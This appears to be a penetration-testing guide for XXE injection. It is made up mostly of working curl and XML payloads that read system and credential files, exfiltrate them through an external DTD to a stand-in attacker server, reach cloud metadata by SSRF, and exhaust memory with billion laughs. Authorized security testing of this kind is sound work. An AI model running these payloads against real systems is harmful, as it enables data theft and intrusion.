# XML External Entity (XXE) Injection Testing

## Objective

Identify endpoints that parse XML input and are vulnerable to XXE attacks — allowing local file disclosure, server-side request forgery (SSRF), denial-of-service, or remote code execution in some configurations.

---

## 1. Identify XML Processing Entry Points

| Entry Point | Examples |
|---|---|
| XML body APIs | SOAP endpoints, REST APIs accepting `Content-Type: application/xml` |
| File upload | .docx, .xlsx, .pptx, .svg, .xml file uploads |
| SAML authentication | SAMLResponse parameter |
| RSS/Atom feeds | Feed import features |
| Data import | XML-based bulk import |
| SVG processing | SVG upload or rendering |
| Office documents | Server-side docx/xlsx processing |

---

## 2. Basic XXE Detection — File Read

### 2.1 Classic XXE
```bash
# Test XML endpoint with external entity declaring file read
curl -si -X POST https://target/api/parse \
  -H "Content-Type: application/xml" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>' | grep -E "root:|daemon:|HTTP"
```

### 2.2 XXE in SOAP
```bash
curl -si -X POST https://target/api/soap \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: processData" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <data>&xxe;</data>
  </soapenv:Body>
</soapenv:Envelope>' | grep -iE "HTTP|hostname|root:"
```

---

## 3. High-Value Target Files

```bash
# Linux
XXE_FILES=(
  "file:///etc/passwd"
  "file:///etc/hostname"
  "file:///etc/hosts"
  "file:///proc/self/environ"
  "file:///proc/self/cmdline"
  "file:///var/www/html/.env"
  "file:///app/.env"
  "file:///app/config/database.yml"
)

for FILE in "${XXE_FILES[@]}"; do
  echo "Testing: $FILE"
  curl -si -X POST https://target/api/parse \
    -H "Content-Type: application/xml" \
    -d "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"$FILE\">]><root>&xxe;</root>" \
    | grep -E "root:|DB_|SECRET|HTTP" | head -3
  sleep 0.3
done
```

---

## 4. Blind XXE — Out-of-Band Detection

When no entity value is reflected in the response:

### 4.1 DNS OOB via External DTD
```bash
COLLAB="YOUR_COLLAB.burpcollaborator.net"

# Basic DNS pingback
curl -si -X POST https://target/api/parse \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM \"http://$COLLAB/xxe-test\">
]>
<root>&xxe;</root>" | grep HTTP

# If collaborator receives request → XXE confirmed (blind)
```

### 4.2 Blind XXE via External DTD for File Exfiltration
```bash
# Host this DTD at http://YOUR_SERVER/evil.dtd
cat > /tmp/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_SERVER/?data=%file;'>">
%eval;
%exfil;
EOF

# Trigger the DTD load
curl -si -X POST https://target/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://YOUR_SERVER/evil.dtd">
  %remote;
]>
<root>test</root>' | grep HTTP
```

---

## 5. XXE via SSRF

Use XXE to trigger SSRF to internal services:

```bash
COLLAB="YOUR_COLLAB.burpcollaborator.net"

# SSRF via XXE — internal HTTP request
curl -si -X POST https://target/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>' | grep -iE "ami-id|instance|HTTP"

# Internal service probe
curl -si -X POST https://target/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<root>&xxe;</root>' | grep -iE "HTTP|Internal|server"
```

---

## 6. XXE in File Upload

### SVG Upload XXE
```bash
cat > /tmp/xxe_test.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text y="20">&xxe;</text>
</svg>
EOF

curl -si -X POST https://target/upload \
  -F "file=@/tmp/xxe_test.svg;type=image/svg+xml" \
  -H "Cookie: session=USER_TOKEN" | grep HTTP

# Access the uploaded SVG
curl -s https://target/uploads/xxe_test.svg | grep "root:"
```

### DOCX/XLSX XXE
- Unzip the .docx file
- Modify `word/document.xml` or `[Content_Types].xml` with XXE payload
- Re-zip and upload
- Check if server processes XML and returns file contents

---

## 7. XXE in SAML

SAML uses XML — if XXE is possible in the SAML parser:

```bash
# Intercept SAML assertion (base64-decoded)
# Add DOCTYPE and external entity before <samlp:Response>
# Re-encode and send

# Safe test — check if SAML parser resolves external entities
# Use OOB DNS callback
PAYLOAD="<?xml version=\"1.0\"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM \"http://$COLLAB/saml-xxe\">
]>
$(base64-decoded-saml-assertion-with-entity)"

# Check if collaborator receives DNS/HTTP request
```

---

## 8. DoS via Billion Laughs (Quad DTD Entity)

> **Rule:** Run ONLY with explicit DoS testing authorization. Do not run on production.

```xml
<!-- Exponential entity expansion — causes memory exhaustion -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>
```

**Do NOT submit this to production.** Note it as a theoretical risk if XXE is confirmed.

---

## Evidence to Capture

- The XML payload used
- The response showing file content (`root:x:0:0:...`) or OOB callback
- For blind XXE: Collaborator log showing DNS/HTTP interaction
- HTTP request and response (redact file contents beyond first line)

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| XXE reading /etc/passwd | Pass/Fail | High |
| XXE reading .env / config file | Pass/Fail | Critical |
| Blind XXE via OOB DNS | Pass/Fail | High |
| XXE via SVG upload | Pass/Fail | High |
| XXE → SSRF to cloud metadata | Pass/Fail | Critical |
| XXE in SAML parsing | Pass/Fail | High |
